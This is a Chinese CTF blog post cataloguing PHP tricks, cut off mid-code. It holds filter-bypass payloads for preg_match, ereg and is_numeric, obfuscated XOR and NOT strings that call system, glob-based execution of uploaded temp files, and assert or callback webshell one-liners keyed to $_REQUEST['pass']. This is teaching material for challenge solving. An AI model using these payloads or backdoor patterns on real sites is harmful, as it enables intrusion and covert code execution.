<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>sx-zhang</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="sx-zhang"><meta name="msapplication-TileImage" content="/img/mylogo.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="sx-zhang"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="摘要：本文总结了ctf中涉及php的tricks"><meta property="og:type" content="blog"><meta property="og:title" content="sx-zhang"><meta property="og:url" content="https://sx-zhang.top/2022/05/29/web/PHP%E7%9A%84tricks/"><meta property="og:site_name" content="sx-zhang"><meta property="og:description" content="摘要：本文总结了ctf中涉及php的tricks"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://s2.loli.net/2022/05/30/My7EKucwznBFSkW.png"><meta property="og:image" content="https://s2.loli.net/2022/06/08/XjDzQf61uVPAaHe.png"><meta property="og:image" content="https://s2.loli.net/2022/05/30/Po8u6qYBcOIQasM.png"><meta property="og:image" content="https://s2.loli.net/2022/06/02/zeHhvOYNqZlS7r9.png"><meta property="og:image" content="https://s2.loli.net/2022/05/30/m8KGvD1UWVBpZe6.png"><meta property="og:image" content="https://s2.loli.net/2022/06/08/tnSLOwqyuvQXAl7.png"><meta property="og:image" content="https://s2.loli.net/2022/06/07/kMV7Hl6ONaWYJDU.png"><meta property="og:image" content="https://s2.loli.net/2022/06/07/OL675yudzZkmgXa.png"><meta property="article:published_time" content="2022-05-29T08:58:50.000Z"><meta property="article:modified_time" content="2022-06-25T04:37:56.978Z"><meta property="article:author" content="Shixuan Zhang"><meta property="article:tag" content="php"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://s2.loli.net/2022/05/30/My7EKucwznBFSkW.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://sx-zhang.top/2022/05/29/web/PHP%E7%9A%84tricks/"},"headline":"sx-zhang","image":["https://s2.loli.net/2022/05/30/My7EKucwznBFSkW.png","https://s2.loli.net/2022/06/08/XjDzQf61uVPAaHe.png","https://s2.loli.net/2022/05/30/Po8u6qYBcOIQasM.png","https://s2.loli.net/2022/06/02/zeHhvOYNqZlS7r9.png","https://s2.loli.net/2022/05/30/m8KGvD1UWVBpZe6.png","https://s2.loli.net/2022/06/08/tnSLOwqyuvQXAl7.png","https://s2.loli.net/2022/06/07/kMV7Hl6ONaWYJDU.png","https://s2.loli.net/2022/06/07/OL675yudzZkmgXa.png"],"datePublished":"2022-05-29T08:58:50.000Z","dateModified":"2022-06-25T04:37:56.978Z","author":{"@type":"Person","name":"Shixuan Zhang"},"publisher":{"@type":"Organization","name":"sx-zhang","logo":{"@type":"ImageObject","url":"https://sx-zhang.top/img/mylogo.jpg"}},"description":"摘要：本文总结了ctf中涉及php的tricks"}</script><link rel="canonical" href="https://sx-zhang.top/2022/05/29/web/PHP%E7%9A%84tricks/"><link rel="icon" href="/img/mylogo.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/mylogo.jpg" alt="sx-zhang" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">文章</a><a class="navbar-item" href="/categories">目录</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/zhangsx19"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-29T08:58:50.000Z" title="2022/5/29 16:58:50">2022-05-29</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-25T04:37:56.978Z" title="2022/6/25 12:37:56">2022-06-25</time></span><span class="level-item"><a class="link-muted" href="/categories/security/">security</a></span><span class="level-item">36 minutes read (About 5410 words)</span></div></div><div class="content"><p><strong>摘要：本文总结了ctf中涉及php的tricks</strong></p>
<span id="more"></span>
<hr>
<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p><a target="_blank" rel="noopener" href="http://www.javashuo.com/article/p-cwpcukmt-ek.html">kali</a></p>
<h1 id="一-伪随机数"><a href="#一-伪随机数" class="headerlink" title="一.伪随机数"></a>一.伪随机数</h1><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。<br>提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。并且如果设置了 seed参数 生成的随机数就是伪随机数，即每次生成的随机数是一样的<br>mt_rand()的值与<code>调用次数、操作系统、php版本(浏览器插件查看)</code>有关<br>若不知道seed，可用<a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">工具</a>或自己遍历种子与随机数比较</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在linux下面make之后运行脚本添加随机数 time ./php_mt_seed 183607393 <span class="comment">#一定加time否则很慢</span></span><br><span class="line">或 time ./php_mt_seed 1328851649 1328851649 0 2147483647 1423851145 <span class="comment">#第一次范围，第二次缺省，第三次调用输出的随机数为1423851145</span></span><br></pre></td></tr></table></figure>
<h1 id="二、函数"><a href="#二、函数" class="headerlink" title="二、函数"></a>二、函数</h1><h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>1.如果第二个参数是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 “0” 开始，使用 8 进制(octal)；否则，使用 10 进制 (decimal)。注意数字前可以加’+’<br>2.intval() 不能用于 object和数组，否则会产生 E_NOTICE 错误并返回 1（通常配合preg_match来使用）<br>3.小数舍去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e1000&#x27;</span>)=<span class="number">1</span> <span class="comment">//英文字母后的数字都省略</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="number">665.999999</span>)==<span class="number">665</span> <span class="comment">//而665.9999999==666成立</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>())=<span class="number">0</span>,<span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))=<span class="number">1</span>,<span class="title function_ invoke__">intval</span>(<span class="keyword">array</span>(<span class="string">&#x27;aa&#x27;</span>,<span class="string">&#x27;bb&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>))=<span class="number">1</span> <span class="comment">//非空的数组会返回1,注意在url输入[]来表示数组，array会被认作字符串</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="string">&#x27;0x3A&#x27;</span>)=<span class="number">0</span>,<span class="title function_ invoke__">intval</span>(<span class="number">0x3A</span>)=<span class="number">58</span>,<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;0x3A&#x27;</span>,<span class="number">0</span>)=<span class="number">58</span> <span class="comment">//十六进制,八进制开头是0</span></span><br></pre></td></tr></table></figure>
<h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><p>返回的匹配次数，不匹配为0，匹配成功1次即为1，然后停止搜索<br>preg_match_all()不同于此，它会一直搜索直到到达结尾</p>
<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>\056\160\150\x70为16进制和8进制ascii代码<br>“\|”就是表示”|”<br>|属于正则中的元字符，表示或的意思，因此表示’|’字符本身必须转义<br>\本身具有转义作用，\表示\ ,’\|’传给正则就是”|“,表示对|进行转义，不作为特殊字符使用</p>
<h3 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h3><p>1.数组绕过，如果发生错误(比如传进参数是数组),两者返回 FALSE。常配合file_put_contents的数组漏洞使用<br><img src="https://s2.loli.net/2022/05/30/My7EKucwznBFSkW.png" alt="20220530161635"><br>2.多行匹配&#x2F;m<br>看到&#x2F;i可想到%0a绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/^AB/会匹配<span class="string">&quot;ABn e&quot;</span>中的A，但是不会匹配<span class="string">&quot;ab AB&quot;</span>中的A <span class="comment">//匹配开始行</span></span><br><span class="line">[^a-zA-Z0-<span class="number">9</span>]表示“找到一个非字母也非数字的字符”。 <span class="comment">//取否</span></span><br><span class="line"></span><br><span class="line">/i <span class="comment">//忽略大小写</span></span><br><span class="line">/g <span class="comment">//全文查找出现的所有匹配字符</span></span><br><span class="line">/m <span class="comment">//多行查找,可通过%0a绕过,详细参见https://wenku.baidu.com/view/a897bc29f22d2af90242a8956bec0975f465a4c0.html</span></span><br><span class="line"></span><br><span class="line">^php <span class="comment">//开头匹配 如phpaaa</span></span><br><span class="line">php$ <span class="comment">//结尾匹配 如aaaphp</span></span><br><span class="line">^php$ <span class="comment">//只有php能匹配</span></span><br></pre></td></tr></table></figure>
<p>3.长度溢出</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;very&#x27;</span>, <span class="string">&#x27;250000&#x27;</span>).<span class="string">&#x27;36Dctfshow&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>4.命名空间绕过<br>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法<br>如限制函数开头不能有字母和数字，可用\phpinfo()绕过</p>
<p>5.无字母数字<br>a.eval php7以上<br>返回字符串中代码的返回值<br>原理：eval(“(‘phpinfo’)();”);</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//限制v1,v2为数字，v3无数字和字母，参见p牛博客</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line"><span class="comment">//1-phpinfo()-1;</span></span><br><span class="line"><span class="comment">//1^(&#x27;system&#x27;)(&#x27;cat f*&#x27;)^1;//高版本</span></span><br></pre></td></tr></table></figure>
<ul>
<li>位运算<br>可用的运算符:&amp;,|,~,^<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v2=^(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa^%96%89)^ //v2=|(~%8c%86%8c%8b%9a%92)(~%93%8c)|</span></span><br><span class="line"><span class="comment">//c=(&#x27;``````&#x27;|&#x27;%13%19%13%14%05%0d&#x27;)(&#x27;``&#x27;|&#x27;%0c%13&#x27;)</span></span><br></pre></td></tr></table></figure>
<img src="https://s2.loli.net/2022/06/08/XjDzQf61uVPAaHe.png" alt="20220608232028"><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">生成脚本</a></li>
<li>自增 ‘Y’&#x3D;&gt;’Z’&#x3D;&gt;’AA’<br>b.system</li>
<li>shell下可以利用.来执行任意脚本(任意后缀名如txt)，如当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令，且不需要file有x权限<br>Linux文件名支持用glob通配符代替</li>
</ul>
<p>发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母。<br>随便向一个php里post都可以，它会被保存在tmp那个目录(任何程序都可写)。每次执行完脚本会清空tmp<br>执行. &#x2F;tmp&#x2F;phpXXXXXX，也是有字母的。此时就可以用到Linux下的glob通配符,&#x2F;tmp&#x2F;phpXXXXXX可以表示为&#x2F;*&#x2F;?????????或&#x2F;???&#x2F;?????????<br>但能够匹配上&#x2F;???&#x2F;?????????这个通配符的文件有很多，若在执行第一个匹配上的文件的时候出现错误，会导致整个流程停止，根本不会执行到我们上传的文件。<br>但所有文件名都是小写，只有PHP生成的临时文件包含大写字母。可以利用[@-[]来表示大写字母，替代要匹配的那个?<br>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。(repeater多点几次，多生成些随机文件)</p>
<ul>
<li><code>$(command)</code> 返回command这条命令的stdout（可嵌套）<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(()) <span class="comment">#0</span></span><br><span class="line">~$(()) <span class="comment">#~0</span></span><br><span class="line">$((~$(()))) <span class="comment">#-1</span></span><br><span class="line">$(($((~$(())))+$((~$(()))))) <span class="comment">#-2</span></span><br><span class="line">$((~$(($((~$(())))+$((~$(()))))))) <span class="comment">#2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>6.下划线限制绕过<br>PHP接收参数时，发现表单名中如果是 句号(.)或者空格( )，会被转换成下划线(_)<br>解决方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A[W.C <span class="comment">//A_W.C</span></span><br></pre></td></tr></table></figure>
<h2 id="ereg-eregi"><a href="#ereg-eregi" class="headerlink" title="ereg(),eregi()"></a>ereg(),eregi()</h2><p>绕过：ereg()函数存在NULL截断漏洞，当传入的字符串包含%00时，只有%00前的字符串会传入函数并执行，而后半部分不会传入函数判断。因此可以使用%00截断，连接非法字符串，从而绕过函数<br>注意在PHP7已废用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">eregi</span>(正则表达式，匹配字符串)<span class="comment">//不区分大小写</span></span><br><span class="line">如<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])限制了password的形式，只能是一个或者多个数字、大小写字母，可以使用%<span class="number">00</span>截断正则匹配。password=<span class="number">1e8</span>%<span class="number">00</span>*-*</span><br><span class="line">如<span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>)可令<span class="variable">$b</span>=.或<span class="variable">$b</span>=%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<h2 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file"></a>highlight_file</h2><p>用绝对路径和相对路径..&#x2F;和.&#x2F;绕过，得到文件包含<br><code>$_SERVER</code>参数会自动加上HTTP_<br>文件上传时可以用show_source(<strong>FILE</strong>);看上传成功没有</p>
<h2 id="file-put-contents-文件名，内容"><a href="#file-put-contents-文件名，内容" class="headerlink" title="file_put_contents(文件名，内容)"></a>file_put_contents(文件名，内容)</h2><p>1.函数第二个允许传入数组，将被连接为字符串再写入<br><img src="https://s2.loli.net/2022/05/30/Po8u6qYBcOIQasM.png" alt="20220530162849"><br>注意会覆盖原文件内容，有时要想好再写<br>2.文件名可以是index.php</p>
<h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">in_array</span> ( 要在数组搜索的值 , 要搜索的数组, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">FALSE</span>) <span class="comment">//漏洞在于第三个参数可选，如不设置为true就不检测类型，是弱比较，相当于==号，如&quot;1.php&quot;==1</span></span><br></pre></td></tr></table></figure>
<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric"></a>is_numeric</h2><p>非数值-&gt;数值：<br>1.可以将非数值字符串转换为16进制再进行判断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span> -&gt; <span class="number">0x31206f722031</span></span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;0x123&quot;</span>);<span class="comment">//php7以后为false,以前为true</span></span><br></pre></td></tr></table></figure>
<p>2.在数字前加上空格，也会被is_numeric函数认为是数字</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trim函数会过滤空格以及\n\r\t\v\<span class="number">0</span>，但不会过滤\f=&gt;%<span class="number">0</span>c</span><br><span class="line"><span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;%0c36&quot;</span>) <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>数值-&gt;非数值的绕过:<br>可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以；%20加在数值末尾也可以绕过</p>
<h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file"></a>is_file</h2><p>绕过：利用函数所能处理的长度限制进行目录溢出。从而让is_file认为不是一个文件</p>
<h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>调用的函数还可以嵌套回调函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单参数回调</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(函数,参数)<span class="comment">//可无参数或一参数 </span></span><br><span class="line"><span class="comment">//可调用此文件及库文件定义好的函数(默认有hex2bin,bin2hex等字符串和16进制转换可用)</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(数组,函数)<span class="comment">//第二个参数可以传入参数列表组成的数组</span></span><br><span class="line"><span class="comment">//数组操作 单参数</span></span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(数组,函数)<span class="comment">//将数组中所有元素遍历并用指定函数处理过滤用的</span></span><br><span class="line"><span class="title function_ invoke__">array_map</span>(函数,数组)<span class="comment">//一样</span></span><br><span class="line"><span class="title function_ invoke__">register_shutdown_function</span>(函数, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">register_tick_function</span> (函数, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">filter_var_array</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));<span class="comment">//php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//php 5.4.8+后的版本，assert函数由一个参数，增加了一个可选参数descrition =&gt;有两个参数的回调函数</span></span><br><span class="line"><span class="title function_ invoke__">uasort</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]),函数);</span><br><span class="line"><span class="title function_ invoke__">uksort</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]),函数);</span><br><span class="line"><span class="comment">//面向对象</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$arr</span>-&gt;<span class="title function_ invoke__">uasort</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">array_reduce</span>(<span class="keyword">array</span>(<span class="number">1</span>), fun, <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_udiff</span>(<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="number">1</span>), fun);</span><br><span class="line"></span><br><span class="line"><span class="comment">//三参数回调</span></span><br><span class="line">php中，可以执行代码的函数：</span><br><span class="line">一个参数：assert</span><br><span class="line">两个参数：assert （php5.<span class="number">4.8</span>+）</span><br><span class="line">三个参数：preg_replace /e模式</span><br><span class="line"><span class="title function_ invoke__">mb_ereg_replace</span>(<span class="string">&#x27;.*&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">preg_filter</span>(<span class="string">&#x27;|.*|e&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">array_walk</span>(<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>], <span class="string">&#x27;&#x27;</span>);<span class="comment">//?e=preg_replace</span></span><br><span class="line"><span class="title function_ invoke__">array_walk_recursive</span>(<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>] =&gt; <span class="string">&#x27;|.*|e&#x27;</span>,), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>], <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="无参函数"><a href="#无参函数" class="headerlink" title="无参函数"></a>无参函数</h2><p>限制传输进参数的函数名必须是字母函数且不能有参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);<span class="comment">//fuzzing</span></span><br></pre></td></tr></table></figure>
<h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=Peter&amp;age=43&quot;</span>,<span class="variable">$myArray</span>);<span class="comment">//Array ( [name] =&gt; Peter [age] =&gt; 43 )</span></span><br></pre></td></tr></table></figure>
<h2 id="eval-assert"><a href="#eval-assert" class="headerlink" title="eval,assert"></a>eval,assert</h2><p>题目给了<code>eval(&quot;$c&quot;)</code>,构造<code>$c</code>的方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="keyword">echo</span>/var_dump/<span class="keyword">print</span> <span class="variable">$flag</span>/<span class="variable">$GLOBALS</span>;</span><br><span class="line"><span class="number">2</span>.highlight_file/<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/06/02/zeHhvOYNqZlS7r9.png" alt="20220602121923"></p>
<h2 id="base-convert-number-frombase-tobase"><a href="#base-convert-number-frombase-tobase" class="headerlink" title="base_convert(number,frombase,tobase);"></a>base_convert(number,frombase,tobase);</h2><p>frombase和tobase介于 2 和 36 之间（包括 2 和 36）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>); <span class="comment">//但会转换小写和去掉特殊符号，所以常配合hex2bin等使用</span></span><br></pre></td></tr></table></figure>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">class_exists</span>(<span class="variable">$class</span>)<span class="comment">//判断类是否存在,当类不存在时会调用__autoload(),尝试加载未定义的类</span></span><br></pre></td></tr></table></figure>
<h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p><a target="_blank" rel="noopener" href="https://my.oschina.net/huyex/blog/2885273">参考</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);<span class="comment">//可以控制函数名和第二个参数</span></span><br><span class="line"><span class="title function_ invoke__">creat_function</span>(<span class="keyword">string</span> <span class="variable">$agrs</span>,<span class="keyword">string</span> <span class="variable">$code</span>)</span><br><span class="line"><span class="comment">//string $agrs	声明的函数变量部分</span></span><br><span class="line"><span class="comment">//string $code	执行的方法代码部分</span></span><br><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$fname&#x27;</span>, <span class="string">&#x27;echo $fname.&quot;Zhang&quot;&#x27;</span>)</span><br><span class="line">但实际会编译成</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span 